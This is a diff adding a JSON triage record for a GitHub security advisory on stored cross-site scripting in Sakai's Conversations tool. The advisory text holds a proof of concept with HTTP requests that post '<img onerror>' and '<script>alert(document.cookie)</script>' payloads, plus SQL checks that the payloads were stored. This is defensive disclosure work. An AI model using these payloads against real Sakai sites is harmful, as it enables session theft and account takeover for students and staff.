@@ -1,0 +1,62 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2404584?v=4\", \"events_url\": \"https://api.github.com/users/geo-chen/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/geo-chen/followers\", \"following_url\": \"https://api.github.com/users/geo-chen/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/geo-chen/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/geo-chen\", \"id\": 2404584, \"login\": \"geo-chen\", \"node_id\": \"MDQ6VXNlcjI0MDQ1ODQ=\", \"organizations_url\": \"https://api.github.com/users/geo-chen/orgs\", \"received_events_url\": \"https://api.github.com/users/geo-chen/received_events\", \"repos_url\": \"https://api.github.com/users/geo-chen/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/geo-chen/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/geo-chen/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/geo-chen\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/810505?v=4\", \"events_url\": \"https://api.github.com/users/ottenhoff/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ottenhoff/followers\", \"following_url\": \"https://api.github.com/users/ottenhoff/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ottenhoff/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ottenhoff\", \"id\": 810505, \"login\": \"ottenhoff\", \"node_id\": \"MDQ6VXNlcjgxMDUwNQ==\", \"organizations_url\": \"https://api.github.com/users/ottenhoff/orgs\", \"received_events_url\": \"https://api.github.com/users/ottenhoff/received_events\", \"repos_url\": \"https://api.github.com/users/ottenhoff/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ottenhoff/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ottenhoff/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ottenhoff\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54049\", \"cvss\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"### Summary\\n\\nThe Sakai Conversations tool stores topic and post messages without HTML sanitization, and the frontend renders them using LitElement's `unsafeHTML()` directive, resulting in stored cross-site scripting (XSS). Any authenticated user with access to a site that has the Conversations tool enabled can inject arbitrary HTML and JavaScript that executes in the browsers of all other users who view that topic or post.\\n\\n\\n### Description\\n\\nThe Conversations REST API endpoint `POST /api/sites/{siteId}/topics` accepts a `message` field in the JSON request body. The service layer (`ConversationsServiceImpl`) stores the message directly to the database (`conv_topics.MESSAGE`) without invoking `FormattedText.processFormattedText()` or any equivalent HTML sanitizer.\\n\\nThe same issue affects post replies via `POST /api/sites/{siteId}/topics/{topicId}/posts` and comments stored in `conv_comments`.\\n\\nOn the frontend, `SakaiTopic.js`, `SakaiPost.js`, and `SakaiComment.js` all render the `message` field using LitElement's `unsafeHTML()` directive:\\n\\n- `SakaiPost.js` lines 429, 432: `${unsafeHTML(this.post.message)}`\\n- `SakaiTopic.js` line 679: `${unsafeHTML(this.topic.message)}`\\n- `SakaiComment.js` line 148: `${unsafeHTML(this.comment.message)}`\\n\\nUnlike other Sakai tools (Announcements, Assignments, Resources) which call `FormattedText.processFormattedText()` before persisting user content, the Conversations implementation has no equivalent protection at storage time or render time.\\n\\n### Proof of Concept\\n\\n**Setup:** Admin/instructor session on a site with the Conversations tool enabled (siteId `BELP_275K_7418`).\\n\\n**Step 1 - Inject XSS payload in topic:**\\n\\n```\\nPOST /api/sites/BELP_275K_7418/topics HTTP/1.1\\nHost: localhost:9107\\nCookie: SAKAIID=<authenticated-session>\\nContent-Type: application/json\\n\\n{\\\"title\\\":\\\"XSS Test Topic\\\",\\\"message\\\":\\\"<img src=x onerror=alert(1)>\\\",\\\"type\\\":\\\"QUESTION\\\",\\\"visibility\\\":\\\"SITE\\\",\\\"draft\\\":false}\\n```\\n\\nResponse: HTTP 200, `\\\"message\\\":\\\"<img src=x onerror=alert(1)>\\\"` - raw HTML stored.\\n\\n**Step 2 - Verify stored in database:**\\n\\n```sql\\nSELECT TOPIC_ID, TITLE, MESSAGE FROM conv_topics\\nWHERE TOPIC_ID='e4c599c2-bd32-4364-9cbd-a5c9c102edfb';\\n-- Result: MESSAGE = <img src=x onerror=alert(1)>\\n```\\n\\n**Step 3 - Inject XSS payload in post reply:**\\n\\n```\\nPOST /api/sites/BELP_275K_7418/topics/e4c599c2-bd32-4364-9cbd-a5c9c102edfb/posts HTTP/1.1\\nHost: localhost:9107\\nCookie: SAKAIID=<authenticated-session>\\nContent-Type: application/json\\n\\n{\\\"message\\\":\\\"<script>alert(document.cookie)<\\\\/script>\\\",\\\"siteId\\\":\\\"BELP_275K_7418\\\"}\\n```\\n\\nResponse: HTTP 200, `\\\"message\\\":\\\"<script>alert(document.cookie)</script>\\\"` - raw script stored.\\n\\n**Step 4 - Verify in database:**\\n\\n```sql\\nSELECT POST_ID, MESSAGE FROM conv_posts\\nWHERE POST_ID='e3cf7aed-c630-448a-89bb-27a8baacd269';\\n-- Result: MESSAGE = <script>alert(document.cookie)</script>\\n```\\n\\nWhen any site member loads the Conversations view, the LitElement web component fetches the stored messages via the REST API and renders them with `unsafeHTML()`, causing the injected scripts and event handlers to execute.\\n\\n### Impact\\n\\nAn attacker with any site membership (student role or higher) can:\\n- Perform actions on behalf of victims\\n- Exfiltrate gradebook data and course content\\n- In a university context with hundreds of students per course, a single malicious post can compromise all enrolled students simultaneously\\n\\n### Status / timeline:\\n- 2026-06-02: Fix committed to master (`2696b4b48cbef2e81512f52f84f7477adff78b27`)\\n- Release pending.\", \"epss\": {\"percentage\": 0.00032, \"percentile\": 0.09955}, \"ghsa_id\": \"GHSA-w2x5-gv52-9ccv\", \"github_reviewed_at\": \"2026-08-24T19:37:53Z\", \"html_url\": \"https://github.com/advisories/GHSA-w2x5-gv52-9ccv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w2x5-gv52-9ccv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54049\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-24T19:37:53Z\", \"references\": [\"https://github.com/sakaiproject/sakai/security/advisories/GHSA-w2x5-gv52-9ccv\", \"https://github.com/sakaiproject/sakai/commit/2696b4b48cbef2e81512f52f84f7477adff78b27\", \"https://github.com/sakaiproject/sakai/releases/tag/23.5\", \"https://github.com/advisories/GHSA-w2x5-gv52-9ccv\"], \"repository_advisory_url\": \"https://api.github.com/repos/sakaiproject/sakai/security-advisories/GHSA-w2x5-gv52-9ccv\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/sakaiproject/sakai\", \"summary\": \"Sakai Conversations has a Stored XSS Issue\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-24T19:37:55Z\", \"url\": \"https://api.github.com/advisories/GHSA-w2x5-gv52-9ccv\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.sakaiproject.conversations:sakai-conversations-impl\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 23.0, <= 23.3\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.sakaiproject.kernel:sakai-kernel-impl\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 23.0, <= 23.3\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.sakaiproject.rubrics:rubrics-impl\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 23.0, <= 23.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w2x5-gv52-9ccv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "org.sakaiproject.conversations:sakai-conversations-impl: >= 23.0, <= 23.3",
+      "org.sakaiproject.kernel:sakai-kernel-impl: >= 23.0, <= 23.3",
+      "org.sakaiproject.rubrics:rubrics-impl: >= 23.0, <= 23.3"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-54049"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "org.sakaiproject.conversations:sakai-conversations-impl",
+      "org.sakaiproject.kernel:sakai-kernel-impl",
+      "org.sakaiproject.rubrics:rubrics-impl"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-25T19:19:13.094527Z",
+  "provenance": {
+    "content_sha256": "58d87839439debf6ee78004b9dfd4aa57eaa38136490b725c07a551e9046ae2f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-24T19:37:53Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w2x5-gv52-9ccv",
+  "status": "active",
+  "title": "Sakai Conversations has a Stored XSS Issue",
+  "updated_at": "2026-08-24T19:37:55Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w2x5-gv52-9ccv"
+}
